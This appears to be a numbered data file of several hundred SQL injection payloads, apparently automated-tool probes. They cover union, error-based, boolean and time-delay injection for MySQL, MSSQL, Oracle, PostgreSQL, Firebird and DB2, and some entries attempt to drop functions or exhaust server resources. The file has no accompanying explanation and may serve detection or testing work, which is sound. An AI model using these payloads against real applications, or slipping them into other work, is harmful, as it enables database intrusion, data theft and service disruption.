653 -9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616 
655 select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    
659 -8794   )    )     )   union all select 5802,5802,5802-- 
661 1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  # 
663 -2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291# 
667 -4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc 
668 -2658  )   as casi where 7364  =  7364 or 8245  =  9651-- 
669 -7041"   )    )     )   union all select 2159,2159,2159,2159,2159-- 
670 -1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
672 -4091"   )    )     )   union all select 6694,6694-- 
673 select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  # 
677 -4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ' 
678 -2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026-- 
679 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  ' 
680 select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||' 
687 -5798" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   
689  select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1 
690 -3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  -- 
691  union   (  select NULL, NULL,   (  select @@version   )    )    -- 
692 -2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
693 waitfor delay '0:0:5' and 'gsvt'  =  'gsvt 
694 -5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942-- 
695  select * from users where id  =  1 or "._" or 1  =  1 -- 1 
701 -9841 where 4612  =  4612 union all select 4612-- 
702 -9434"  )   as cqlw where 1600  =  1600 or 2733  =  1047-- 
705 select pg_sleep  (  5  )   and    (    (   "qani"  =  "qani 
709 -9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  -- 
710 ns 
713 -7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  -- 
715  select * from users where id  =  1 or 1#"? or 1  =  1 -- 1 
720  end and    (    (   "dmgj"  =  "dmgj 
722 1'+  (  select nash where 4159  =  4159 union all select null# 
724 -4210"  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
727 select   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  select 5418 from master..sysdatabases  )   end  )  -- 
729 -8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  ' 
730 -1487"  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407-- 
732 select count  (  *  )   from generate_series  (  1,5000000  )   and "ihbe" like "ihbe 
733 -4286%"   )    )     )   union all select 2229,2229,2229,2229,2229,2229# 
737 -2920"   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
738 28% 
739 -8043%"   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  "%"  =  " 
743 -2817  )   where 1212  =  1212 or 3266  =  1102 
746 select case when 3661  =  9315 then 1 else null end-- 
752  select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1' 
754 -2120'  )   or 8734  =  8844# 
757 -9613"   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  "pupl"  =  "pupl 
758 \x27UNION SELECT 
762  select * from users where id  =  1 or "  (  _" or 1  =  1 -- 1 
763 -7951'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'blak'  =  'blak 
767 -6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- 
769 1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +' 
774 select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
779 -6527'   )    )    union all select 5053,5053,5053,5053-- 
780 if  (  1928  =  4811  )   select 1928 else drop function ucko-- 
781  (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    )  
782 waitfor delay '0:0:5' and   (  4614  =  4614 
783 -5575" union all select 8665,8665,8665,8665,8665,8665,8665-- 
788 select * from users where id  =  1 + $+%1 or 1  =  1 -- 1 
789 iif  (  7011  =  2522,1,1/0  )   
796  select * from users where id  =  1 or ";[" or 1  =  1 -- 1 
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
798 -2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838 
799 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  "%"  =  " 
804 select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and "ejmj" like "ejmj 
806 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- 
807 -1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967-- 
815 -5196"   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  "gbcq" like "gbcq 
822 iif  (  4460  =  1610,1,1/0  )   
823  select * from users where id  =  1 or @#",  =  1 union select 1,version  (    )   -- 1 
826 -1390%"   )    )    union all select 8930,8930,8930,8930,8930# 
829 select case when 2599  =  7035 then 1 else null end-- 
830 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru 
831 -6731" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166-- 
836 -4830"   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  "dyut"  =  "dyut 
838  select * from users where id  =  1 or @#"{  =  1 or 1  =  1 -- 1 
840  select * from users where id  =  1. union select null,version  (    )   -- 1 
842 -5637%"   )    )     )   or 6872  =  6872 and    (    (     (  "%"  =  " 
843 -5379'  )   union all select 4294,4294,4294-- 
846 1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null# 
848 -2912'   )    )    order by 1-- 
852 select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  "dskh"  =  "dskh 
853  (  case when 8422  =  8452 then 1 else null end  )  
855 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   "%"  =  " 
858 iif  (  4638  =  8258,1,1/0  )   
860 1'+  (  select eluw where 6210  =  6210 
863  select * from users where id  =  1 *\. union select null,@@VERSION -- 1 
865  select * from users where id  =  1 or 1#"? union select 'a',version  (    )   -- 1 
866 -8128"   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375-- 
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
869 -5539"  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189-- 
870 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  "lsvg" like "lsvg 
873 -2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx 
879 1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   -- 
880 -9739' or 8571  =  8571-- 
885 iif  (  5257  =  5257,1,1/0  )   
886 -6155%'   )    )    union all select 2421,2421,2421,2421,2421# 
887 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # 
888 select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  -- 
890 -7395%" order by 1-- 
891  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq 
892 -1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896-- 
895 -8521'+  (  select ucim where 9003  =  9003 union all select 9003-- 
896 -2013"   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
897  select * from users where id  =  1 +\. union select null,@@VERSION -- 1 
898 -2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  ' 
900 -9265"  )   or 7834  =  1685 
901 1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198-- 
902 -9859"   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595# 
903 select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  # 
905 -8028%'   )    )     )   or 5042  =  5214 
906 -5640"   )    )    or 9792  =  2728-- 
908 -5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
911   (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   
912 -2568"  )   or   (  8459  =  8459  )  *4906 and   (  "exyw"  =  "exyw 
913 or 1 in   (  select @@version  )  -- 
914 select case when 7634  =  3954 then 1 else null end-- 
917  select * from users where id  =  1.<1# union select 1,version  (    )   -- 1 
918   (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  "sxih"  =  "sxih 
923 select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473 
924 -3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ' 
935  or uname like '% 
940 1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +' 
941 select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   "gydr" like "gydr 
942 select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca 
944 -9358' or 9887  =  2569-- 
946 -6030%'  )   or 3038  =  3038 
949 -6076"   )    )    or 8277  =  4757 
951 1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- 
952 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and "%"  =  " 
953 waitfor delay '0:0:5' 
955  select * from users where id  =  1 or @#";  =  1 or 1  =  1 -- 1 
958 1'+  (  select 'ngdk' where 7264  =  7264 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +' 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
960 hi' or 1  =  1 -- 
964 1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639-- 
966 a' -- 
967 1'+  (  select 'vtyw' where 7950  =  7950 order by 1-- 
970 select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
971 -5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218-- 
973 -6475"   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  "mdsx" like "mdsx 
974 -7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- 
975 select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  # 
979 select pg_sleep  (  5  )   and "zhsc"  =  "zhsc 
980 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq 
983 -9864"  )   or elt  (  5885  =  4936,4936  )   and   (  "bfbb" like "bfbb 
984 make_set  (  5679  =  9769,9769  )   
988 select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  # 
990 1'+  (  select dklj where 3265  =  3265 
992 -2869'   )    )    union all select 3216-- 
994 1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +' 
996 -7333%"   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  "%"  =  " 
1002 -3107'  )   where 7782  =  7782 or 8571  =  8571-- 
1005 end and    (    (     (  'xzbk'  =  'xzbk 
1009 "  )   or benchmark  (  10000000,MD5  (  1   )    )   # 
1011 -3321" where 1603  =  1603 union all select 1603,1603,1603,1603# 
1012 if  (  8995  =  9787  )   select 8995 else drop function ofgg-- 
1017 -9037%" union all select 6583# 
1018 -1641' union all select 4835# 
1019 -9429'  )   order by 1-- 
1022 elt  (  2567  =  9921,9921  )   
1024 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz 
1028 select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  # 
1029  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )  
1031 select pg_sleep  (  5  )   and '%'  =  ' 
1032 -1235"   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   "ahhz" like "ahhz 
1033 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +' 
1036 -4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603-- 
1039 select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +' 
1041 select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  # 
1042 -7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
1044 select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  -- 
1048 select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977 
1049   )   or sleep  (  __TIME__  )    =  ' 
1050 -1203"   )    )    or 8571  =  8571-- 
1051 -9535" order by 1-- 
1053  select * from users where id  =  '1' union select \.#,@@VERSION -- 1' 
1056 select case when 8227  =  1229 then 1 else null end-- 
1060  select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1' 
1063 select * from users where id  =  1 <@. or 1  =  1 -- 1 
1064 -4305   )    )     )   union all select 2401,2401-- 
1067 -5322" union all select 6494,6494,6494,6494,6494,6494-- 
1069 -5147 or   (  8459  =  8459  )  *4906 
1070 -3707"   )    )     )   or 8571  =  8571-- 
1073 -1587'  )   or 8339  =  5540 
1075 1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +' 
1076 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih 
1080  or '1'   =   '1 
1081 -4032'  )   where 5157  =  5157 or 1809  =  2810# 
1085 -8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ' 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1088 -7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo 
1091 1'+  (  select 'dhcv' where 9372  =  9372 
1094 ^' 
1096 -4408"  )   or 6872  =  6872 and   (  "oenu"  =  "oenu 
1097 call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup 
1098 -8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze 
1100 -6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024# 
1101 -7466 where 5161  =  5161 or 3038  =  3038 
1103 select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1 
1104 -6218'   )    )    or 2236  =  4469# 
1105 -8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  
1108 -9896"   )    )     )   union all select 4073,4073,4073,4073,4073# 
1110 select   (  case when   (  7163  =  1777  )   then 1 else 7163*  (  select 7163 from master..sysdatabases  )   end  )  -- 
1117 -5963" or 9323  =  9323# 
1120 -6263%"   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   "%"  =  " 
1122 select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq 
1123 -1602' or 3038  =  3038 
1124 select case when 2930  =  7964 then 1 else null end-- 
1126 select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
1129 -9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038 
1132 1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- 
1134 -2190'  )   where 8890  =  8890 union all select 8890,8890# 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1137 select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo 
1140  end and    (    (   "%"  =  " 
1142 -3672"   )    )    union all select 6093# 
1143 iif  (  1217  =  8831,1,1/0  )   
1144  select * from users where id  =  1 or "?  (  " or 1  =  1 -- 1 
